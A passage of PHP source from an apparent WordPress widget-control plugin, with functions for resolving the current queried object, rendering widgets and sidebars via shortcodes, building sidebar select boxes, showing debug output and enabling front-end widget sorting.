	
	return $twc_menu_item_url;
}

/**
 * Save the original object id
 * 
 * @return string $twc_menu_item_object_id
 */
function twc_set_object_id()
{
	//initializing variables
	global $wp_query, $twc_menu_item_object;
	static $twc_menu_item_object_id;
	
	//reasons to fail
	if (isset($twc_menu_item_object_id)) return $twc_menu_item_object_id;
	
	if (!isset($wp_query))
	{
		wp_reset_query();
	}
	
	if (is_admin() && !$wp_query->have_posts())
	{
		//this is used for the admin area
		if (isset($_REQUEST['post']) && $post = get_post($_REQUEST['post']))
		{
			if ($post->post_type == 'page')
			{
				$query = array('page_id' => $post->ID);
			}
			else
			{
				$query = array('p' => $post->ID, 'post_type' => 'any');
			}
			$wp_query->query($query);
		}
		
	}
	
	//now that the wp_query is setup, we get the object id
	$wp_query->get_queried_object();
	$twc_menu_item_object_id = $wp_query->queried_object_id;
	
	//getting the object type
	if (isset($wp_query->queried_object))
	{
		if (isset($wp_query->queried_object->term_id))
		{
			$twc_menu_item_object = 'category';
		}
		elseif (isset($wp_query->queried_object->post_type))
		{
			$twc_menu_item_object = $wp_query->queried_object->post_type;
		}
	}
	
	return $twc_menu_item_object_id;
}

/**
 * Function is responsible for display a widget via shortcode
 *
 * @param unknown_type $atts
 * @param unknown_type $content
 */
function twc_shortcode_widget( $atts, $content = '' )
{
	extract(shortcode_atts(array(
	      'id' => false,
     ), $atts));
	twc_widget($id, true);
}

/**
 * Enter description here...
 *
 * @param unknown_type $atts
 * @param unknown_type $content
 */
function twc_shortcode_sidebar( $atts, $content = '' )
{
	extract(shortcode_atts(array(
	      'id' => false,
     ), $atts));
	twc_sidebar($id, true);
}

/**
 * function shows debug info
 * 
 * @return unknown
 */
function twc_show_object_id()
{
	//initializing varaibles
	$debug_locations = (isset($_REQUEST['twc_debug']));
	
	//reasons to fail
	if ( TWC_CURRENT_USER_CANNOT ) return false;
	if (!$debug_locations) return false;
	echo '<div style="position:absolute;top:0px;left:0px;background:#fff;padding:5px;">'.twc_get_object_id().'</div>';
}

/**
 * function is responsible for displaying the original widgets
 *
 * @return null
 */
function twc_sidebar_originals()
{
	//deprecated
}

/**
 * Just prints a sidebar
 *
 * @param unknown_type $default
 * @return unknown
 */
function twc_sidebar_select_box( $default = 'wp_inactive_widgets', $widget = null, $format = false, $name = null )
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$select_filter = '';
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	if (!is_null($name))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
	}
	elseif ($format)
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'sidebar';
	}
	elseif (!is_null($widget))
	{
		$id = 'twc_sidebar_select_box_'.$widget['id'];
		$name = 'widget-'.$widget['id_base'].'['.$widget['number'].'][sidebar_slug]';
	}
	
	$select = '<select id="'.$id.'" name="'.$name.'" class="twc_sidebar_select_box">'.$select_filter;
	
	foreach ($sidebars as $slug => $sidebar)
	{
		$positions = count($sidebars_widgets[$slug]);
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} positions='$positions' value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * Just prints a filter sidebar
 * 
 * @return unknown
 */
function twc_sidebar_filter_box()
{
	//initializing variables
	global $wp_registered_sidebars;
	$sidebars = $wp_registered_sidebars;
	$class = array('','selected="true"');
	$default = twc_filter_list_for();
	
	$select = '<select name="twcp_filter" class="twc_sidebar_filter_box">'
			. '<option value="">  -  '.__('Remove Filter','twc').'  -  </option>';
		
	foreach ($sidebars as $slug => $sidebar)
	{
		$selected = 0;
		if ($default == $slug) $selected = 1;
		$select .= "<option {$class[$selected]} value='$slug'>{$sidebar['name']}</option>";
	}
	
	return $select.'</select>';
}

/**
 * function is responsible for putting the widget back together.
 * This function also keeps track of the widget loop within the dynamic_sidebar.
 * Once the dynamic_sidebar function is completed, we declare a do_action to
 * activate our own sidebar function.
 *
 * @param unknown_type $widget
 */
function twc_trigger_sidebar( $widget_shell )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets;
	static $keeping_count;
	$debug_locations = (isset($_REQUEST['twc_debug']));
	$sidebar_id = twc_get_widgets_sidebar($widget_shell['id']);
	$count = twc_count_sidebar_widgets($sidebar_id);
	
	if (!isset($keeping_count))
	{
		$keeping_count = 0;
	}
	$keeping_count++;
	
	if ($count == $keeping_count)
	{
		//ensures that we have a well formed widget variable before calling our sidebar
		$wp_registered_widgets = $twc_wp_registered_widgets;
		if ($debug_locations) echo '<div style="border: 1px dashed pink;min-height:25px;"><b>'.$sidebar_id.'</b>';
		if (TWC_IS_SORTER) echo '<div class="twc_sortable_sidebar">';
		
		do_action('twc_dynamic_sidebar', $sidebar_id);
		
		if (TWC_IS_SORTER) echo '</div>';
		if ($debug_locations) echo '</div>';
		
		$keeping_count = 0;
	}
	
}

/**
 * Button encourages the user to upgrade to pro
 *
 */
function twc_upgrade_button()
{
	if (function_exists('twc_widget_protitle')) return;
	echo '<a class="twc_upgrade_button button-primary" href="'.admin_url('widgets.php?action=register&license=1').'">'.__('Upgrade to Pro $9','twc').'</a>';
}

/**
 * This function adds the view switches to the wordpress widget page
 * 
 * @return unknown
 */
function twc_view_switch()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasons to fail
	if ((!$GLOBALS['TWCAUTH']) && (twc_list_style_twc() 
	|| $current_screen->parent_base != 'widgets')) return false;
	
	echo '<div>'.twc_get_show_view('twc-view-switch').'</div>';
	
}

/**
 * Function sets the global $widget variable
 *
 * @return null
 */
function twc_widget_global()
{
	//initializingn variables
	global $widget;
	$widget_id = (isset($_REQUEST['widget_id']))? $_REQUEST['widget_id']: ((isset($_REQUEST['widget-id']))? $_REQUEST['widget-id'] : ((isset($_REQUEST['editwidget']))? $_REQUEST['editwidget']: false));
	
	//loading resources
	$widget = twc_get_widget_by_id( $widget_id );
	
	//reasons to return
	if (!$widget) return;
	
}

/**
 * Function returns the widgets grouped by sidebar
 *
 * @return unknown
 */
function twc_wp_get_sidebars_widgets()
{
	$sidebars_widgets = wp_get_sidebars_widgets();
	if ( empty( $sidebars_widgets ) )
		$sidebars_widgets = wp_get_widget_defaults();
	
	return $sidebars_widgets;
}

/**
 * Function is paving the way for the front end sortables for administrators
 *
 * @param string $display
 * @param object $widget
 * @return string
 */
function twc_sortable_wrapper( $display, $widget )
{
	$t = '';
	if (TWC_IS_SORTER) $t .= '<div class="twc_sortable_widget" id="twc-'.$widget['id'].'" position="'.$widget['position'].'">';
	$t .= $display;
	if (TWC_IS_SORTER) $t .= '</div>';
	
	return $t;
}

/**
 * wraps the widget display
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twcp_widget_wrapper( $display, $widget )
{
	//initializing variables
	global $twc_widget_to_wrap, $twc_widget;
	
	//reasons to return
	if (!twc_has_wrapper( $widget )) return $display;
	
	//initializing variables
	$wrapper = $widget['p']['twcp_wrapper_file'];
	$twc_widget_to_wrap = $display;
	$twc_widget = $widget;
	
	ob_start();
	require $wrapper;
	$wrapped = ob_get_clean();
	
	if (!$wrapped) twc_display_debug('Wrapper didn\'t return any results');
	
	return $wrapped;
}

/**
 * function is responsible for returning the widget class
 * 
 */
function twc_widget_object()
{
	//initializing variables
	global $twc_widget;
	return $twc_widget;
}

/**
 * function is responsible for including the required files for sortables
 *
 */
function twc_sortable_initialize()
{
	//reasons to fail
	if (!TWC_IS_SORTER) return false;
	
	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'jquery-ui-sortable' );
	wp_enqueue_script( 'twc-sortables' );
	
	wp_enqueue_style( 'twc-sortables' );
	
}





